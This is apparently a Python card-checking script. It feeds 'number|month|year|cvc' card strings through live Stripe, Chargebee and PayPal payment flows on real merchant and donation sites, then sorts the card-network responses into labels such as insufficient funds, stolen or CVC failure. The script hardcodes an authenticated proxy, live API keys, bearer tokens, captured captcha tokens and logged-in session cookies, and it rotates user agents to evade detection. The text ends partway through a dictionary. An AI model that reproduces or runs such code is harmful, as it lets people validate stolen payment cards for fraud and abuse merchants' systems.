import requests
import re
import random
import time
import string,json
import base64
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import pycountry,jwt
username = "uscgpwlo"
password = "xnwshl3oo5c0"
proxy = "64.137.96.74:6641"
proxy = {"http":"http://{}:{}@{}".format(username, password, proxy)}
def vip(card_data):
	import requests
	ua = UserAgent()
	rua = ua.random
	card_data = card_data.split('|')
	n = card_data[0]
	mm = card_data[1]
	yy = card_data[2]
	cvc = card_data[3]
	if len(yy) == 2:
		yy = f'20{yy}'
	else:
	   yy = card_data[2]
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'time_on_page=18297&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=dcb67eec-1d69-42f5-9355-7243b2b78808f1bd8f&sid=8f79f1a0-73e4-4cf0-81e8-161b254f1130f1edcb&key=pk_live_51CTrxFJGbMz6kgJijIfhMZYDGIF2QWOcZJXwgG0WwQ6WoE9Jyle3CBtGqNOB2tX1yv2BrhqJG0G1IT2DMrUBNuUO00jrTq1PDh&payment_user_agent=stripe.js%2F78ef418&card[number]={n}&card[exp_month]={mm}&card[exp_year]={yy}&card[name]=fdgd+dfhygfd&card[address_line1]=fdhgdtrf&card[address_city]=sertresd&card[address_state]=ewtsd&card[address_zip]=46535&card[address_country]=BS'
	
	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:
		return(response.json()['error']['message'])
	headers = {
	    'authority': 'scraperapi.chargebee.com',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'authorization': 'Bearer 252ed58dd3b7b9f098de3642e992c486',
	    'content-type': 'application/json',
	    'origin': 'https://js.chargebee.com',
	    'referer': 'https://js.chargebee.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	json_data = {
	    'cardBillingAddress': {
	        'firstName': 'fdgd',
	        'lastName': 'dfhygfd',
	        'addressLine1': 'fdhgdtrf',
	        'city': 'sertresd',
	        'state': 'ewtsd',
	        'countryCode': 'BS',
	        'zip': '46535',
	    },
	    'billingAddress': {
	        'firstName': 'fdgd',
	        'lastName': 'dfhygfd',
	        'addressLine1': 'fdhgdtrf',
	        'city': 'sertresd',
	        'state': 'ewtsd',
	        'countryCode': 'BS',
	        'zip': '46535',
	    },
	    'customerBillingAddress': {
	        'firstName': 'dfgdfgfd',
	        'lastName': 'dfrtgy',
	        'addressLine1': 'RDT Field Office Road',
	        'city': 'Uravakonda',
	        'state': 'Andhra Pradesh',
	        'stateCode': 'AP',
	        'countryCode': 'IN',
	        'zip': '515812',
	    },
	    'customer': {
	        'firstName': 'dfgdfgfd',
	        'lastName': 'dfrtgy',
	        'email': 'visaspam77@gmail.com',
	    },
	    'tmpToken': id,
	    'reattempt': True,
	    'recaptchaToken': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQPsnVIZ3qUyaMwUfEUWqQATp40i0t7NFYpdjJ6EuZnHUNEN-tmoVREjppzv_9gO1hlo4UAp0jsmTYTS_CG2za4jiCITFUA4n3opUDs0PBL7H9H1UEdYvHXgRbAovlQzx1kd_5Iyj8T-VW6E8pfKfnyUBHMvLQX1qFf0tBG5VlIgwNoAHmJX0dJnCB0R1mStEHRTFn-xsWJJ0cIqy9pceUZeZv9S8LlosTmQ9TdV96ymnloc3qpFEsolWl33_G1-3ejv5nfEU9nC3DOFn-AcAGAxVDANRzcEENkezELzYnCRqO2FhIvQ0e3HHoE479aVqw3TwQye_lJ2VWGlvGbYcmoONPIV3wu4DOtwE0fUCnFejMfQqhYO-azEfs3IKv5lw3TLPWSxc9opQDhqnch8IF4oGiO6nF9ZQiMsnfh7F5oSIuPy1FLNEUrTegpcy0NppsFlqTm93cGg6O4B4NMCD2WL9G4x_Tgv4eWe06bb1t8t7HB6zHdjtWIy48E7FwXX3_cCpyEw7c3EdrmUxbWKO1F7YP0G-pFKkxkOxecsvmlZ-ejjDIUIAclR1CEcK7iosf4C9znHjgpqu6wTJ3giCqE36CRqBAUTbCZtU4UGRFnVrJgmogGv5sOdX5wkvtSmtq5ZRaBXiVMIJIkO2HPKtYsNflkLZ8wfhn1xPGD5dcJ3KGSIJs_yWhqO99mTTQsU5ofPQb1rG8qDwbH--PfkAosVr6IQiSwU9JrO2c9zR0I5MvwC_XOYxPwfELPZwipAIwbEpjwZGrJRRNm5HPfc_CiUAZbyX4Arrr4CcaKHQ2EWKQQ2M4lDuui3nW4BR2muGY0QA7SdA-MxFpxH0pT0kowXBY9XsPpYNKOeyykfYmD_V_bP5taRjrrHBO4ccvPK3t2A6tF6tKgo_IEhQbK7ka2F_3WMQVRxLLgogM2R6aEH_WWsNfnZuKUMVb6rnF4v2Vb1Z2SCkWNwebMnsWcua3TqcE0eqeYdwaCaAcBfMvcPhp-J38pPFNasEB-9Ddt8SMr6Ih066R-7umTscL9vT2KS-mEQlgtVeQUFO1gtLedBOWdWAJN36xv5ERAPx8LnDkkm1VrS18plq9v4WSQbsah9okSXXzLTpzJh6vC-U14eb8Ea71pgobaw-Jwxh0A4JmrM823K1eINCIeMt5VM1S_lIlJMl4TzJiwDyJDTNYhy1HsgmI-GFpdbEgj_G6PGdnQkaIpA0dFBKuUF18ArvJphLJMkfSJNFSiY-NJJLzTvbvv-zcr-2ZCP5wy7hg1LUniCIq_PqMNV5wCanU27EKxsbby8qmenf5nf1xXhura2krTOBeAfVbn5SXpy4zyjZXhwzmY3iH-oc2hhcmRfaWTOMa1MgaJrcqgyYmFmZjgxMqJwZAA.KUBM4NXhm1rdcqYKEk3pjpEhNlnmUM9ldu08qhNj6sI',
	}
	
	response = requests.post(
	    'https://scraperapi.chargebee.com/api/internal/payment_intents/confirm',
	    headers=headers,
	    json=json_data,
	)
	return(response.json()['payment_intent']['active_payment_attempt']['error_detail']['error_message'])
def stc(card_data):
	import requests
	ua = UserAgent()
	rua = ua.random
	card_data = card_data.split('|')
	n = card_data[0]
	mm = card_data[1]
	yy = card_data[2]
	cvc = card_data[3]
	if len(yy) == 2:
		yy = f'20{yy}'
	else:
	   yy = card_data[2]
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'time_on_page=18297&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=dcb67eec-1d69-42f5-9355-7243b2b78808f1bd8f&sid=8f79f1a0-73e4-4cf0-81e8-161b254f1130f1edcb&key=pk_live_51CTrxFJGbMz6kgJijIfhMZYDGIF2QWOcZJXwgG0WwQ6WoE9Jyle3CBtGqNOB2tX1yv2BrhqJG0G1IT2DMrUBNuUO00jrTq1PDh&payment_user_agent=stripe.js%2F78ef418&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&card[name]=fdgd+dfhygfd&card[address_line1]=fdhgdtrf&card[address_city]=sertresd&card[address_state]=ewtsd&card[address_zip]=46535&card[address_country]=BS'
	
	response = requests.post('https://api.stripe.com/v1/tokens', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:
		return(response.json()['error']['message'])
	headers = {
	    'authority': 'scraperapi.chargebee.com',
	    'accept': 'application/json, text/plain, */*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'authorization': 'Bearer AzZn7ZUBuDxRNES1MRqf80foUUS68oTdmDwWOkcdBIgyCcdrAUY',
	    'content-type': 'application/json',
	    'origin': 'https://js.chargebee.com',
	    'referer': 'https://js.chargebee.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	json_data = {
	    'cardBillingAddress': {
	        'firstName': 'fdgd',
	        'lastName': 'dfhygfd',
	        'addressLine1': 'fdhgdtrf',
	        'city': 'sertresd',
	        'state': 'ewtsd',
	        'countryCode': 'BS',
	        'zip': '46535',
	    },
	    'billingAddress': {
	        'firstName': 'fdgd',
	        'lastName': 'dfhygfd',
	        'addressLine1': 'fdhgdtrf',
	        'city': 'sertresd',
	        'state': 'ewtsd',
	        'countryCode': 'BS',
	        'zip': '46535',
	    },
	    'customerBillingAddress': {
	        'firstName': 'dfgdfgfd',
	        'lastName': 'dfrtgy',
	        'addressLine1': 'RDT Field Office Road',
	        'city': 'Uravakonda',
	        'state': 'Andhra Pradesh',
	        'stateCode': 'AP',
	        'countryCode': 'IN',
	        'zip': '515812',
	    },
	    'customer': {
	        'firstName': 'dfgdfgfd',
	        'lastName': 'dfrtgy',
	        'email': 'visaspam77@gmail.com',
	    },
	    'tmpToken': id,
	    'reattempt': True,
	    'recaptchaToken': 'P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQPsnVIZ3qUyaMwUfEUWqQATp40i0t7NFYpdjJ6EuZnHUNEN-tmoVREjppzv_9gO1hlo4UAp0jsmTYTS_CG2za4jiCITFUA4n3opUDs0PBL7H9H1UEdYvHXgRbAovlQzx1kd_5Iyj8T-VW6E8pfKfnyUBHMvLQX1qFf0tBG5VlIgwNoAHmJX0dJnCB0R1mStEHRTFn-xsWJJ0cIqy9pceUZeZv9S8LlosTmQ9TdV96ymnloc3qpFEsolWl33_G1-3ejv5nfEU9nC3DOFn-AcAGAxVDANRzcEENkezELzYnCRqO2FhIvQ0e3HHoE479aVqw3TwQye_lJ2VWGlvGbYcmoONPIV3wu4DOtwE0fUCnFejMfQqhYO-azEfs3IKv5lw3TLPWSxc9opQDhqnch8IF4oGiO6nF9ZQiMsnfh7F5oSIuPy1FLNEUrTegpcy0NppsFlqTm93cGg6O4B4NMCD2WL9G4x_Tgv4eWe06bb1t8t7HB6zHdjtWIy48E7FwXX3_cCpyEw7c3EdrmUxbWKO1F7YP0G-pFKkxkOxecsvmlZ-ejjDIUIAclR1CEcK7iosf4C9znHjgpqu6wTJ3giCqE36CRqBAUTbCZtU4UGRFnVrJgmogGv5sOdX5wkvtSmtq5ZRaBXiVMIJIkO2HPKtYsNflkLZ8wfhn1xPGD5dcJ3KGSIJs_yWhqO99mTTQsU5ofPQb1rG8qDwbH--PfkAosVr6IQiSwU9JrO2c9zR0I5MvwC_XOYxPwfELPZwipAIwbEpjwZGrJRRNm5HPfc_CiUAZbyX4Arrr4CcaKHQ2EWKQQ2M4lDuui3nW4BR2muGY0QA7SdA-MxFpxH0pT0kowXBY9XsPpYNKOeyykfYmD_V_bP5taRjrrHBO4ccvPK3t2A6tF6tKgo_IEhQbK7ka2F_3WMQVRxLLgogM2R6aEH_WWsNfnZuKUMVb6rnF4v2Vb1Z2SCkWNwebMnsWcua3TqcE0eqeYdwaCaAcBfMvcPhp-J38pPFNasEB-9Ddt8SMr6Ih066R-7umTscL9vT2KS-mEQlgtVeQUFO1gtLedBOWdWAJN36xv5ERAPx8LnDkkm1VrS18plq9v4WSQbsah9okSXXzLTpzJh6vC-U14eb8Ea71pgobaw-Jwxh0A4JmrM823K1eINCIeMt5VM1S_lIlJMl4TzJiwDyJDTNYhy1HsgmI-GFpdbEgj_G6PGdnQkaIpA0dFBKuUF18ArvJphLJMkfSJNFSiY-NJJLzTvbvv-zcr-2ZCP5wy7hg1LUniCIq_PqMNV5wCanU27EKxsbby8qmenf5nf1xXhura2krTOBeAfVbn5SXpy4zyjZXhwzmY3iH-oc2hhcmRfaWTOMa1MgaJrcqgyYmFmZjgxMqJwZAA.KUBM4NXhm1rdcqYKEk3pjpEhNlnmUM9ldu08qhNj6sI',
	}
	
	response = requests.post(
	    'https://scraperapi.chargebee.com/api/internal/payment_intents/confirm',
	    headers=headers,
	    json=json_data,
	)
	return(response.json()['payment_intent']['active_payment_attempt']['error_detail']['error_message'])
def pay(card_data):
	session = requests.Session()
	ua = UserAgent()
	rua = ua.random
	card_data = card_data.split('|')
	num = card_data[0]
	mon = card_data[1]
	year = card_data[2]
	cvv = card_data[3]
	if len(year) == 2:
		year = f'20{year}'
	else:
	   year = card_data[2]	
	card = f"{num}|{mon}|{year}|{cvv}"
	last4 = num[-4:]
	if num.startswith("4"):
		card_brand = "Visa"
	elif num.startswith("5"):
		card_brand = "MasterCard"
#ââââââââââââââââââââââ#
	headers = {
	'authority': 'metager.org',
	'accept': '*/*',
	'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'referer': 'https://metager.org/spende/1/once/paypal/card',
	'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
	'sec-ch-ua-mobile': '?1',
	'sec-ch-ua-platform': '"Android"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'same-origin',
	'user-agent': rua,
}

	response1 = requests.get('https://metager.org/spende/1/once/paypal/card/order', headers=headers,proxies=proxy)
	iD = response1.json()["id"]
	print(iD)
	
	if len(iD) != 17:
		process_card_p(card_data)
#ââââââââââââââââââââââ#
	response = requests.get('https://metager.org/spende/5/once/paypal/card',proxies=proxy)
	
	value_start = response.text.find('<input type="hidden" name="client-token" value="') + len('<input type="hidden" name="client-token" value="')
	value_end = response.text.find('">', value_start)
	value = response.text[value_start:value_end]
	
	decoded_value = base64.b64decode(value).decode('utf-8')
	
	json_decoded = json.loads(decoded_value)
	
	accs = (json_decoded["paypal"]["accessToken"])
	headers = {
	'authority': 'cors.api.paypal.com',
	'accept': '*/*',
	'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'authorization': f"Bearer {accs}",
	'braintree-sdk-version': '3.32.0-payments-sdk-dev',
	'content-type': 'application/json',
	'origin': 'https://assets.braintreegateway.com',
	'paypal-client-metadata-id': 'b48dd81b0e228e04cc95b3351723794e',
	'referer': 'https://assets.braintreegateway.com/',
	'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
	'sec-ch-ua-mobile': '?1',
	'sec-ch-ua-platform': '"Android"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'cross-site',
	'user-agent': rua,
}
	json_data = {
	'payment_source': {
		'card': {
			'number': num,
			'expiry': f'{year}-{mon}',
			'security_code': cvv,
			'attributes': {
				'verification': {
					'method': 'SCA_WHEN_REQUIRED',
				},
			},
		},
	},
	'application_context': {
		'vault': False,
	},
}
	
	response = requests.post(
	f'https://cors.api.paypal.com/v2/checkout/orders/{iD}/confirm-payment-source',
	headers=headers,
	json=json_data,
	proxies=proxy
)
	if "PAYER_ACTION_REQUIRED" in response.text:  
		msg_text = "3D Authentication"
		return msg_text
	elif "PAYER_CANNOT_PAY" in response.text:
		msg_text = "PAYER_CANNOT_PAY"
		return msg_text
	else:pass
#âââââââââââââââââââââââ#
	headers = {
	'authority': 'metager.org',
	'accept': '*/*',
	'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'content-type': 'application/json',
	'origin': 'https://metager.org',
	'referer': 'https://metager.org/spende/1/once/paypal/card',
	'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',
	'sec-ch-ua-mobile': '?1',
	'sec-ch-ua-platform': '"Android"',
	'sec-fetch-dest': 'empty',
	'sec-fetch-mode': 'cors',
	'sec-fetch-site': 'same-origin',
	'user-agent': rua,
}

	json_data = {
	'orderID': iD,
	}
#âââââââââââââââââââââââ#
	response2 = requests.post('https://metager.org/spende/1/once/paypal/card/order', headers=headers, json=json_data,proxies=proxy)
	response_code = "un"
	try:
		response_code = response2.json()["purchase_units"][0]["payments"]["captures"][0]["processor_response"]["response_code"]
		if response_code.startswith("PP"):
			pay(card_data)
		else:pass
	except:pass
	response_map = {
	"5120": "Insufficient funds",
	"0500": "Card refused",
	"9500": "Fraudulent card",
	"5400": "Card expired",
	"5180": "Luhn Check fails",
	"9520": "Card lost, stolen",
	"1330": "Card not valid",
	"5100": "Card is declined",
	"00N7": "Cvc Check Fails",
	"0580": "Declined by credit institution",
	"un": "Unkwon Response"
}
	try:
		msg_text = response_map[response_code]
		check = True
	except Exception:
		check = False
		msg_text = "Unkwon Response"
	if check:
		if response_code in response_map and response_code != '5120' and response_code != '00N7':
			msg_text = response_map[response_code]
			return msg_text
		elif response_code == "00N7":
			msg_text = response_map[response_code]
			return msg_text
		elif response_code == "5120":
			msg_text = response_map[response_code]
			return msg_text
		if '{"card":{"name"' in response2_text and response_code != "5120" and response_code!= "00N7":
			msg_text = "Thank you very much!"
			return msg_text
	else:
		msg_text='Declined'
		return msg_text
	return f"{msg_text}"
def sa(ccx):
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	import requests
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=+&billing_details[email]=visaspam77%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=efabd305-c4e8-4914-a393-0d7cf04d575b930d3e&sid=51e0577f-a11f-4683-930e-b3b47a32281fa1f6dc&payment_user_agent=stripe.js%2F4094b7b36a%3B+stripe-js-v3%2F4094b7b36a%3B+split-card-element&referrer=https%3A%2F%2Fwww.punctualkart.com&time_on_page=111251&key=pk_live_51MEphsSAJxyVaf1u0iPyJaNbb2ieD9Tp0d20tQkxOenoKBkhfgWN0HCGCTm1BlI9OgdF7eI9IRMuqvygkVTN8u9M003laoeqwf&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYt2Ej0MYPbfD-Ixf8ATTznF89yUc35XQAAZNHxj7cxzzQ0WHAZjJZxErMcwgRc6GxoIqQZzlYIDLMTpJVH73yReAsOBzPthGrvSBqnUeJ1kqF9gyjr2kfSvSRhIboMH8qBCepSidcli1vi85hlYyPfGKRt5o5hoMBNturVB74opEXu4WWs2pPRxakGU9uLlKTc5bZOqSF_1AwqL1MVj1NqYf4cYbCaiRd3leBsa1TmCd7ZmgpTGFAPLfrkdL3RvsGpYd5s7cQJk-aGdQZtCslCvEy1jW2BV3bbPbSy5hoLRIxu1ZJPtwz0Eyf2MWIHYxT3JtROnssrAbMdFppAvjJJ7OVW82s2vnWmC2pC-4ITLNcXjEb5Alrwz-8B0AlER6S8m5XBrH_6NsvyJ8KJ-vl2Bv6RKtnGOKoxzvW_jl0qEng9LTvtz2lauQCJVSZiC1RXUtdT5fHJeEfiGJm1ejnRGPwggBar5SAsREQX0cs6d93BnKe2ar2br9X53BaY5-tdngylHjq0M7gfYfMR7YhaCjGOse5vX3JicMcMKu5qgpAqHsbNi1_14Eue5AJDhrxDwyB16EyYAArwyC7AWi7tUw0C5XPHsrSlPdPB4DqJVE5HujfXo2OMDOKX6CkdPQrCcn4mZUEbKOX2Dcjc6X-RvOJsBj8Uwco3fZgLJrD7_e6Xr06ZIqTtUwf0l_z19doTBV7-LV3IYyFb6c9LpkQiOy1F5s1SkM851SNcaUA8WpEXQCDbctsgfwzDCm8ALSH-TQc9h0cx8-FKwImIJmnpKmjhlJ_Es7Mz5hf24UvTucUm_aBNh6O3Z78iAaH0SBJKV22kkbdpMWnQ-lfyc7ldLDWppAN_Aj8KRymD7S9BvubSMh_54CRjPVC0xDIVXz9rfclxzuPTWLZbRY2u4tiMGSS96iQfMabDXKr0H6E5jb2xW7dOMoMvr-6IiVfhhn1aLqdBXKpM3ZQpNm3q3XUJwG0eUEPr0U83ZtwwWEqW3hDo7sJCZ-WKv9A0OFXbkAcVqKyXmIkiBw7lAkQTMOrSvIDVtUxmfr37KSkGrd6_lIkRzwGrBsOtvhp8qvUySAM2TFr_KWHri6iaHPGQggdqn-ehRJjKjiwvsJ8ve8B1lv23KtZdXVdPhuMfliPECNXmkxYUJR1togMdH5nWzcNCHkwLoUOpgD_83VeLipM-Z58uedcDepmI6jqjHl1Issdyx0p7tFGte_xpApXuiboz2lXnBvzoy6l6Tfr396VLW7g0aUiav3C7ZXEfVlBUyDzmWuu81N0oJOgejJlK_QAKbq3QxLBiCfri5znZC9XzZFC9CC1oGKDwnV4J-ICFqGcFCjdDKmnRQ3cIFS22gzHKMz8T4wueRs6z_EDlNcNTGpUz43gfHLajryzFkpKw1S5eU1GvfJurptFlbkbxHT1UZxiW7EqH6DTffLuzz2b0R2tH4qjWJ7a874973UsPyN58IFyJZxndaFoaR5M5jbaFKUfRJbpuEn_XPXrIEJaviDr9uax68l26CZm9bzeqXbtnl_C0IEUftHU6kl7GpAdx752sdqzDOgEe65f9U5T4lyEoYgN3h8tsCnlcVYJJd2H-1dRmcXCVnAP8Q0aSLbPezvGZmoCpyoo164L6WAEhURTv2-5xkfU989slwoahMXsfpbw2nti4TIRdOFOvEF7-AVNvSity6kb5_ojYpCAn_zXETONrLV3yWoAIpxiCVYKEK1jgriGV7yFS0jmj5ufCSpCEArhVILC_CAyMjkNupyhgREFVxkdDrllWDxLkmsKIZZ5BzXXgU4YJDvfYo33jQpp7LaBa6vqEk74JCqD6w14Y0Vtc6vdRqZ0bABvv7Ux1LKzu1hF0eMuxV-9P69eAdZySk3FKyFM98bWQor41RP3CyVRf21AxB3dOMcnhMUDLGkKzRR1oS_WuD78PoU4blUaup9I6Jn-DQh_F6pXL7T9mvFbktbKSDkHRed-jk3IPDOgW9v0FueS2sWf4_3vcqU-zYlyc9kGfp_kUBbqlM71iSXQQBcR2jMS4cwtaSbe6mClgxtixVfRnyCwQoIBvFjCji4Xg-zfnAJETiT93wHQTejSvgxcOo7m2BwVfo2V4cM5mLVVgqHNoYXJkX2lkzgMxg2-ia3KoM2ViM2YzNTWicGQA.zKteiS7TsWUK8hS1rO1HkxPIRwxQGkrMMBL8ytqzZyY'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=(response.json()['id'])
	cookies = {
	    '_ga': 'GA1.1.1375079124.1714068783',
	    '__stripe_mid': 'efabd305-c4e8-4914-a393-0d7cf04d575b930d3e',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-04-27%2019%3A38%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.punctualkart.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_first_add': 'fd%3D2024-04-27%2019%3A38%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.punctualkart.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
	    '__stripe_sid': '51e0577f-a11f-4683-930e-b3b47a32281fa1f6dc',
	    '_gcl_au': '1.1.1213972866.1714068780.1316387377.1714246745.1714246769',
	    'wordpress_logged_in_26c2028d58b4c1cdf82f5449b46595ab': 'visaspam77%7C1715456371%7CRM4H8LnbvDjho8YcfGMCiPD3QKk1YS9r6jzeBsRsalC%7C0783351d2800befc5c58ad7bb6955f342f05c1061657a6bb321213293047d353',
	    'mailpoet_page_view': '%7B%22timestamp%22%3A1714246772%7D',
	    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.punctualkart.com%2Fmy-account%2Fadd-payment-method%2F',
	    '_ga_7F5K3SNJL8': 'GS1.1.1714246735.3.1.1714246780.0.0.0',
	}
	
	headers = {
	    'authority': 'www.punctualkart.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.1375079124.1714068783; __stripe_mid=efabd305-c4e8-4914-a393-0d7cf04d575b930d3e; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-04-27%2019%3A38%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.punctualkart.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-04-27%2019%3A38%3A54%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.punctualkart.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36; __stripe_sid=51e0577f-a11f-4683-930e-b3b47a32281fa1f6dc; _gcl_au=1.1.1213972866.1714068780.1316387377.1714246745.1714246769; wordpress_logged_in_26c2028d58b4c1cdf82f5449b46595ab=visaspam77%7C1715456371%7CRM4H8LnbvDjho8YcfGMCiPD3QKk1YS9r6jzeBsRsalC%7C0783351d2800befc5c58ad7bb6955f342f05c1061657a6bb321213293047d353; mailpoet_page_view=%7B%22timestamp%22%3A1714246772%7D; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.punctualkart.com%2Fmy-account%2Fadd-payment-method%2F; _ga_7F5K3SNJL8=GS1.1.1714246735.3.1.1714246780.0.0.0',
	    'origin': 'https://www.punctualkart.com',
	    'referer': 'https://www.punctualkart.com/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
